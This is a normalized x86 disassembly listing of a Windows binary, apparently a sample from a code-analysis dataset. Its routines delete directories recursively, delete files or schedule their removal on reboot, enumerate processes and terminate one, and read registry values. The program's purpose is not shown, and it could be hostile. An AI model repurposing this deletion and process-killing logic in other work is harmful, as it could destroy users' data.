cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ebx ebx
cmp [ esi + 0x10 ] ebx
je r-xdata
xor al al
jmp r-xdata
push eax
call [ PathIsDirectoryW@IAT ]
test eax eax
jne r-xdata
push esi
lea ecx [ ebp - 0x28 ]
call sub_40205d
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x18 ]
dec eax
push eax
lea ecx [ ebp - 0x28 ]
call sub_40d672
cmp [ eax ] 0x5c
jne r-xdata
call sub_41084a
retn
cmp [ ebp - 0x14 ] 0x8
lea eax [ ebp - 0x28 ]
cmovae eax [ ebp - 0x28 ]
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
dec eax
push eax
lea ecx [ ebp - 0x28 ]
call sub_4025e7
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_4023e7
mov al bl
xor eax eax
mov [ ebp - 0x2c ] 0x7
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x40 ] ax
push r--data
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x2a8 ]
mov [ ebp - 0x4 ] 0x1
call sub_402bb0
cmp [ eax + 0x14 ] 0x8
pop ecx
jb r-xdata
lea ecx [ ebp - 0x290 ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
mov edi eax
xor ebx ebx
push 0x0
cmp edi 0xffffffff
push 0x1
lea ecx [ ebp - 0x2a8 ]
setne bl
call sub_4023e7
test ebx ebx
je r-xdata
mov eax [ eax ]
push edi
call [ FindClose@IAT ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ ebp - 0x264 ] 0x2e
je r-xdata
push esi
call [ RemoveDirectoryW@IAT ]
lea ebx [ eax - 0x1 ]
neg ebx
push 0x0
sbb bl bl
push 0x1
lea ecx [ ebp - 0x40 ]
inc bl
call sub_4023e7
mov esi [ esi ]
lea eax [ ebp - 0x290 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x2c0 ]
call sub_402bb0
pop ecx
lea ecx [ ebp - 0x264 ]
push ecx
mov edx eax
lea ecx [ ebp - 0x2d8 ]
mov [ ebp - 0x4 ] 0x2
call sub_409419
pop ecx
push eax
lea ecx [ ebp - 0x40 ]
call sub_4020cf
push 0x0
push 0x1
lea ecx [ ebp - 0x2d8 ]
call sub_4023e7
push 0x0
push 0x1
lea ecx [ ebp - 0x2c0 ]
mov [ ebp - 0x4 ] 0x1
call sub_4023e7
test [ ebp - 0x290 ] 0x10
lea ecx [ ebp - 0x40 ]
je r-xdata
call sub_40d2d9
call sub_40d05d
jmp r-xdata
sub_40d207
push ebp
mov ebp esp
sub esp 0x418
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
push edi
xor edi edi
mov esi ecx
mov [ ebp - 0x418 ] edi
test al 0x1
jne r-xdata
mov ebx rw-data
cmp [ rw-data ] edi
jne r-xdata
or eax 0x1
mov [ rw-data ] eax
xor eax eax
push r-xdata
mov [ rw-data ] 0x7
mov [ rw-data ] edi
mov [ rw-data ] ax
call sub_40e8b3
pop ecx
push ebx
mov ecx esi
call sub_40205d
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
xor eax eax
push 0x206
mov [ ebp - 0x20c ] ax
lea eax [ ebp - 0x20a ]
push edi
push eax
call sub_414160
add esp 0xc
lea eax [ ebp - 0x414 ]
push eax
push 0x104
call [ GetTempPathW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
push edi
push r--data
lea eax [ ebp - 0x414 ]
push eax
call [ GetTempFileNameW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
mov ecx ebx
call sub_4022ce
sub_40d2d9
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40e09b
leave
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea ecx [ ebp - 0x1c ]
call sub_40d207
cmp [ ebp - 0x8 ] 0x8
lea eax [ ebp - 0x1c ]
cmovae eax [ ebp - 0x1c ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push eax
call [ DeleteFileW@IAT ]
test eax eax
jne r-xdata
push 0x3
push eax
push esi
call [ MoveFileExW@IAT ]
push 0x0
push 0x1
lea ecx [ ebp - 0x1c ]
call sub_4023e7
mov esi [ esi ]
sub_40d358
push 0x2e4
mov eax sub_41d73f
call sub_41089b
mov edi edx
xor ebx ebx
cmp [ ecx + 0x10 ] ebx
je r-xdata
call sub_41084a
retn
push ecx
lea ecx [ ebp - 0x28 ]
call sub_40205d
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x18 ]
dec eax
push eax
lea ecx [ ebp - 0x28 ]
call sub_40d672
cmp [ eax ] 0x5c
jne r-xdata
cmp [ ebp - 0x14 ] 0x8
lea eax [ ebp - 0x28 ]
cmovae eax [ ebp - 0x28 ]
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
dec eax
push eax
lea ecx [ ebp - 0x28 ]
call sub_4025e7
push ebx
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_4023e7
xor eax eax
mov [ ebp - 0x2c ] 0x7
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x40 ] ax
push r--data
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x2c0 ]
mov [ ebp - 0x4 ] 0x1
call sub_402bb0
cmp [ eax + 0x14 ] 0x8
pop ecx
jb r-xdata
lea ecx [ ebp - 0x290 ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
mov esi eax
xor ebx ebx
push 0x0
cmp esi 0xffffffff
push 0x1
lea ecx [ ebp - 0x2c0 ]
setne bl
call sub_4023e7
test ebx ebx
je r-xdata
mov eax [ eax ]
push esi
call [ FindClose@IAT ]
xor ebx ebx
push ebx
push 0x1
lea ecx [ ebp - 0x40 ]
call sub_4023e7
cmp [ ebp - 0x264 ] 0x2e
je r-xdata
lea eax [ ebp - 0x290 ]
push eax
push esi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
test [ ebp - 0x290 ] 0x10
jne r-xdata
lea eax [ ebp - 0x264 ]
push eax
call [ PathFindExtensionW@IAT ]
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
mov [ ebp - 0x2a8 ] ax
lea eax [ ebp - 0x264 ]
xor ebx ebx
push eax
lea ecx [ ebp - 0x2a8 ]
mov [ ebp - 0x294 ] 0x7
mov [ ebp - 0x298 ] ebx
call sub_4022ce
push r--data
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x2d8 ]
mov [ ebp - 0x4 ] 0x2
call sub_402bb0
pop ecx
lea ecx [ ebp - 0x2a8 ]
push ecx
mov edx eax
lea ecx [ ebp - 0x2f0 ]
mov [ ebp - 0x4 ] 0x3
call sub_4094d7
pop ecx
push eax
lea ecx [ ebp - 0x40 ]
call sub_4020cf
push ebx
push 0x1
lea ecx [ ebp - 0x2f0 ]
call sub_4023e7
push ebx
push 0x1
lea ecx [ ebp - 0x2d8 ]
call sub_4023e7
push ebx
push 0x1
lea ecx [ ebp - 0x2a8 ]
mov [ ebp - 0x4 ] 0x1
call sub_4023e7
cmp [ ebp - 0x2c ] 0x8
lea eax [ ebp - 0x40 ]
cmovae eax [ ebp - 0x40 ]
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
push ecx
push eax
call sub_40f8e0
pop ecx
pop ecx
test eax eax
jne r-xdata
lea ecx [ ebp - 0x40 ]
call sub_40d2d9
sub_40d54a
push 0x134
mov eax sub_41d8d0
call sub_41089b
mov esi edx
mov edi ecx
xor ebx ebx
push 0x103
lea eax [ ebp - 0x11b ]
push ebx
mov [ ebp - 0x124 ] ebx
push eax
mov [ ebp - 0x128 ] edi
mov [ ebp - 0x11c ] bl
call sub_414160
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
add esp 0xc
mov [ edi ] ax
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x14 ] 0x8
mov [ ebp - 0x124 ] 0x1
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax edi
call sub_41084a
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
push ebx
push 0x80
push 0x3
push ebx
push 0x1
push 0x80000000
push esi
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov esi [ esi ]
push ebx
lea eax [ ebp - 0x120 ]
push eax
push 0x104
lea eax [ ebp - 0x11c ]
push eax
push esi
mov [ ebp - 0x120 ] ebx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
lea ecx [ ebp - 0x11c ]
call sub_409b26
mov ebx eax
mov ecx ebx
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
mov edx ebx
lea ecx [ ebp - 0x140 ]
call sub_40da23
pop ecx
mov [ ebp - 0x4 ] 0x1
cmp [ eax + 0x14 ] 0x8
jb r-xdata
push eax
mov ecx edi
call sub_4022ce
push 0x0
push 0x1
lea ecx [ ebp - 0x140 ]
call sub_4023e7
push ebx
call j_sub_40e8f2
pop ecx
mov eax [ eax ]
sub_40d672
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] eax
jbe r-xdata
push r--data
call sub_40e064
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
lea eax [ ecx + eax * 2 ]
pop ebp
retn 0x4
mov ecx [ ecx ]
sub_40d697
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
and [ esi + 0x10 ] 0x0
xor eax eax
push ecx
mov [ esi + 0x14 ] 0x7
mov ecx esi
mov [ esi ] ax
call sub_40223f
mov eax esi
pop esi
leave
retn 0xc
sub_40d6c8
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
mov ecx [ esi + 0x4 ]
mov edi [ ebp + 0x8 ]
cmp edi ecx
jae r-xdata
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp [ esi ] edi
ja r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_40d7df
sub edi [ esi ]
push ebx
mov eax edi
push 0x18
cdq
pop ebx
idiv ebx
mov edi eax
cmp ecx [ esi + 0x8 ]
jne r-xdata
add [ esi + 0x4 ] 0x18
push edi
call sub_4020aa
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_40d7df
add [ esi + 0x4 ] ebx
pop ebx
jmp r-xdata
imul edi edi 0x18
add edi [ esi ]
push edi
call sub_4020aa
pop edi
pop esi
pop ebp
retn 0x4
sub_40d733
push esi
mov esi ecx
push edi
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
pop esi
retn
push ebx
mov ebx [ esi + 0x4 ]
jmp r-xdata
cmp edi ebx
jne r-xdata
push 0x0
push 0x1
mov ecx edi
call sub_4023e7
add edi 0x18
push [ esi ]
call j_sub_40e8f2#2
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop ebx
sub_40d76b
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
or ecx 0xffffffff
mov eax [ edi + 0x10 ]
cmp eax 0x1
jb r-xdata
mov eax ecx
dec eax
cmp eax ecx
cmova eax ecx
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
push 0x1
mov edx ebx
mov ecx esi
call sub_401000
pop ecx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
lea esi [ ecx + eax * 2 ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
or ecx 0xffffffff
sub esi 0x2
jmp r-xdata
cmp esi eax
je r-xdata
sub esi edi
sar esi 0x1
mov eax esi
jmp r-xdata
mov edi [ edi ]
movzx eax [ ebx ]
cmp [ esi ] ax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_40d7df
push ebx
push esi
mov esi ecx
push edi
mov edi [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
mov eax edi
sub eax ecx
push 0x18
cdq
pop ebx
idiv ebx
cmp eax 0x1
jae r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub ecx [ esi ]
mov eax ecx
cdq
idiv ebx
mov ebx 0xaaaaaaa
mov ecx ebx
sub ecx eax
cmp ecx 0x1
jb r-xdata
push r--data
call sub_40e036
sub edi [ esi ]
lea ecx [ eax + 0x1 ]
mov eax edi
push 0x18
cdq
pop edi
idiv edi
mov edx eax
shr edx 0x1
sub ebx edx
cmp ebx eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
cmp eax ecx
cmovb eax ecx
push eax
mov ecx esi
call sub_40d849
sub_40d849
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov ebx ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] edi
test esi esi
je r-xdata
push [ ebp + 0x8 ]
mov edx [ ebx + 0x4 ]
push ecx
push ecx
mov ecx [ ebx ]
push edi
call sub_40d9f7
mov eax [ ebx + 0x4 ]
mov ecx [ ebx ]
mov [ ebp - 0x4 ] eax
sub eax ecx
cdq
mov [ ebp - 0x8 ] 0x18
idiv [ ebp - 0x8 ]
add esp 0x10
mov [ ebp - 0x18 ] eax
test ecx ecx
je r-xdata
cmp esi 0xaaaaaaa
ja r-xdata
imul esi esi 0x18
imul eax eax 0x18
add esi edi
add eax edi
mov [ ebx ] edi
pop edi
mov [ ebx + 0x8 ] esi
pop esi
mov [ ebx + 0x4 ] eax
pop ebx
leave
retn 0x4
cmp ecx [ ebp - 0x4 ]
je r-xdata
call sub_40e005
mov eax esi
imul eax eax 0x18
push eax
call sub_40e73f
mov edi eax
pop ecx
mov [ ebp - 0xc ] edi
test edi edi
je r-xdata
push [ ebx ]
call j_sub_40e8f2#2
mov eax [ ebp - 0x18 ]
pop ecx
mov ebx [ ebp - 0x4 ]
mov edi [ ebp - 0x8 ]
mov esi ecx
push 0x0
push 0x1
mov ecx esi
call sub_4023e7
add esi edi
cmp esi ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0xc ]
mov ebx [ ebp - 0x14 ]
sub_40d904
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
mov esi ecx
mov ecx edx
call sub_4024a4
push eax
mov ecx esi
call sub_4020aa
mov eax esi
pop esi
leave
retn
sub_40d92a
push 0x8
mov eax sub_41d53b
call sub_410868
mov edi edx
mov ebx ecx
mov [ ebp - 0x14 ] ebx
xor ecx ecx
mov [ ebp - 0x10 ] ecx
xor eax eax
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] ecx
mov [ ebx ] ax
mov [ ebp - 0x4 ] ecx
mov ecx edi
mov [ ebp - 0x10 ] 0x1
call sub_40102f
mov esi [ ebp + 0x8 ]
mov ecx ebx
add eax [ esi + 0x10 ]
push eax
call sub_402c6f
mov ecx edi
call sub_40102f
push eax
push edi
mov ecx ebx
call sub_402546
push 0xffffffff
push 0x0
push esi
mov ecx ebx
call sub_4024a4
mov eax ebx
call sub_410836
retn
sub_40d994
push 0x8
mov eax sub_41d53b
call sub_410868
mov edi ecx
mov [ ebp - 0x14 ] edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] ax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ebx
mov eax [ esi + 0x10 ]
add eax [ rw-data ]
mov [ ebp - 0x10 ] 0x1
push eax
call sub_402c6f
push 0xffffffff
push ebx
push rw-data
mov ecx edi
call sub_4024a4
push 0xffffffff
push ebx
push esi
mov ecx edi
call sub_4024a4
mov eax edi
call sub_410836
retn
sub_40d9f7
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ebx edx
mov edi ecx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
test esi esi
je r-xdata
add esi 0x18
add edi 0x18
jmp r-xdata
push edi
mov ecx esi
call sub_4020aa
cmp edi ebx
je r-xdata
sub_40da23
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push ebx
push esi
push edi
mov ebx ecx
xor ecx ecx
push ecx
push ecx
push [ ebp + 0x8 ]
mov eax edx
push eax
push ecx
push ecx
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x30 ] ecx
call [ MultiByteToWideChar@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
test esi esi
jg r-xdata
xor ecx ecx
push 0x2
pop edx
lea eax [ esi + 0x1 ]
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_40e092
mov edi eax
pop ecx
mov [ ebp - 0x24 ] edi
test edi edi
je r-xdata
push r--data
mov ecx ebx
call sub_402085
jmp r-xdata
push esi
push edi
push [ ebp + 0x8 ]
push [ ebp - 0x2c ]
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
xor eax eax
mov [ edi + esi * 2 ] ax
mov eax 0xfeff
cmp [ edi ] ax
jne r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
push edi
lea ecx [ ebp - 0x20 ]
call sub_402085
push edi
call j_sub_40e8f2
pop ecx
lea eax [ ebp - 0x20 ]
push eax
mov ecx ebx
call sub_4020aa
push 0x0
push 0x1
lea ecx [ ebp - 0x20 ]
call sub_4023e7
test esi esi
jle r-xdata
mov ecx [ ebp - 0x28 ]
lea esi [ edi + 0x2 ]
[ edi ] [ esi ]
mov edi [ ebp - 0x24 ]
sub_40daf2
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
mov esi ecx
push edi
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x4 ] 0x20
test ecx ecx
je r-xdata
or edi 0xffffffff
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push ecx
push ecx
mov ecx esi
call sub_40dc2b
mov ecx esi
cmp eax 0xffffffff
je r-xdata
push r--data
mov ecx esi
call sub_4022ce
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push 0xffffffff
sub eax edi
inc eax
push eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edi esi
jmp r-xdata
mov edi [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
lea edx [ eax + ecx * 2 ]
jb r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
call sub_40d697
push eax
mov ecx esi
call sub_4020cf
push 0x0
push 0x1
lea ecx [ ebp - 0x1c ]
call sub_4023e7
cmp edi edx
jb r-xdata
movzx ebx [ edi ]
xor ecx ecx
inc ecx
lea eax [ ebp - 0x4 ]
test eax eax
je r-xdata
add eax 0x2
dec ecx
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
add edi 0x2
cmp [ eax ] bx
je r-xdata
xor eax eax
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp edi 0xffffffff
jne r-xdata
sub edi eax
sar edi 0x1
jmp r-xdata
sub_40dbac
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
mov [ ebp - 0x8 ] ecx
xor ecx ecx
push ecx
push ecx
push 0xffffffff
mov eax edx
push eax
push ecx
push 0xfde9
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
call [ MultiByteToWideChar@IAT ]
mov edi eax
xor ecx ecx
push 0x2
pop edx
lea eax [ edi + 0x1 ]
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_40e092
lea ecx [ edi * 2 + 0x2 ]
push ecx
mov esi eax
push 0x0
push esi
call sub_414160
add esp 0x10
push edi
push esi
push 0xffffffff
push [ ebp - 0x4 ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov ecx [ ebp - 0x8 ]
push esi
call sub_402085
push esi
call j_sub_40e8f2
mov eax [ ebp - 0x8 ]
pop ecx
pop edi
pop esi
leave
retn
sub_40dc2b
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x10 ]
push esi
push edi
mov [ ebp - 0x4 ] 0x20
test eax eax
je r-xdata
or eax 0xffffffff
cmp eax 0xffffffff
jbe r-xdata
dec eax
or eax 0xffffffff
jmp r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
test edx edx
je r-xdata
add edx 0x2
dec esi
jne r-xdata
lea eax [ edx + eax * 2 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
cmp [ edx ] di
je r-xdata
xor edx edx
sub eax ecx
sar eax 0x1
jmp r-xdata
mov ecx [ ecx ]
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
pop edi
pop esi
leave
retn 0x8
sub eax 0x2
jmp r-xdata
cmp eax edx
je r-xdata
movzx edi [ eax ]
xor esi esi
inc esi
lea edx [ ebp - 0x4 ]
sub_40dc9f
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi ecx
mov [ ebp - 0x8 ] edi
cmp ebx eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ edi ] eax
push esi
mov esi [ ebp + 0x10 ]
mov edi eax
movzx eax [ ebx ]
push eax
call sub_40fb8d
mov [ esi ] ax
add ebx 0x2
add esi 0x2
pop ecx
cmp ebx edi
jne r-xdata
mov edi [ ebp - 0x8 ]
mov [ edi ] esi
pop esi
jmp r-xdata
mov eax edi
pop edi
pop ebx
leave
retn
sub_40dce5
push ebp
mov ebp esp
sub esp 0x230
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor esi esi
push esi
push 0x2
mov ebx ecx
call [ CreateToolhelp32Snapshot@IAT ]
mov edi eax
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
push ebx
call [ PathFindFileNameW@IAT ]
push 0x22c
mov ebx eax
lea eax [ ebp - 0x230 ]
push esi
push eax
call sub_414160
add esp 0xc
lea eax [ ebp - 0x230 ]
push eax
push edi
mov [ ebp - 0x230 ] 0x22c
call [ Process32FirstW@IAT ]
mov esi [ ebp - 0x228 ]
lea eax [ ebp - 0x230 ]
push eax
push edi
call [ Process32NextW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x20c ]
push ebx
push eax
call sub_40f8e0
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
push edi
call [ CloseHandle@IAT ]
mov eax esi
sub_40dd89
push ebx
push esi
push edi
mov ebx ecx
call sub_40dce5
xor edi edi
pop edi
pop esi
pop ebx
retn
push eax
push 0x0
push 0x1
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x64
call [ Sleep@IAT ]
mov ecx ebx
call sub_40dce5
inc edi
cmp edi 0x14
jl r-xdata
push 0x0
push esi
call [ TerminateProcess@IAT ]
push esi
call [ CloseHandle@IAT ]
test eax eax
je r-xdata
sub_40ddd3
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push [ esi + 0x4 ]
call [ CloseHandle@IAT ]
and [ esi + 0x4 ] 0x0
pop esi
retn
push [ esi ]
call [ RegCloseKey@IAT ]
and [ esi ] 0x0
sub_40ddfb
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40ddd3
push esi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov al 0x1
and [ esi ] 0x0
xor al al
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_40de2a
push ebp
mov ebp esp
mov eax 0x1010
call sub_4132b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ecx ] 0x0
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov [ ebp - 0x1008 ] 0x1
mov [ ebp - 0x100c ] 0x800
je r-xdata
xor al al
lea edx [ ebp - 0x100c ]
push edx
lea edx [ ebp - 0x804 ]
push edx
lea edx [ ebp - 0x1008 ]
push edx
push 0x0
push eax
push [ ecx ]
call [ RegQueryValueExW@IAT ]
neg eax
sbb al al
inc al
je r-xdata
cmp [ ebp - 0x1008 ] 0x1
jne r-xdata
cmp [ ebp - 0x1008 ] 0x2
jne r-xdata
lea eax [ ebp - 0x804 ]
push eax
jmp r-xdata
mov edi 0x400
push edi
lea eax [ ebp - 0x1004 ]
push eax
lea eax [ ebp - 0x804 ]
push eax
call [ ExpandEnvironmentStringsW@IAT ]
mov [ ebp - 0x100c ] eax
test eax eax
je r-xdata
mov ecx esi
call sub_4022ce
mov al 0x1
jmp r-xdata
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40e09b
leave
retn 0x8
lea ecx [ ebp - 0x1004 ]
push ecx
sub_40def1
push ebp
mov ebp esp
cmp [ r--data ] 0x0
mov eax r--data
je r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
pop ebp
retn
add eax 0x8
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_40df1b
push ebp
mov ebp esp
cmp [ r--data ] 0x0
mov eax r--data
je r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
pop ebp
retn
add eax 0x8
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_40dfc1
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40f78e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_40e8f2#2
pop ecx
sub_40dfe6
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40f78e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_40e8f2#2
pop ecx
sub_40e005
push ebp
mov ebp esp
sub esp 0x10
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] r--data
call sub_40f750
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_4107db
int3
sub_40e036
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_40f72b
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_4107db
int3
sub_40e064
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_40f72b
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_4107db
int3
sub_40e0b0
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
bt [ rw-data ] 0x1
jae r-xdata
cmp edi eax
jb r-xdata
cmp ecx 0x80
jb r-xdata
[ edi ] [ esi ]
jmp r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
test edi 0x3
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
jmp [ ecx * 4 + jump_table_40e584 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40e488 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40e584 ]
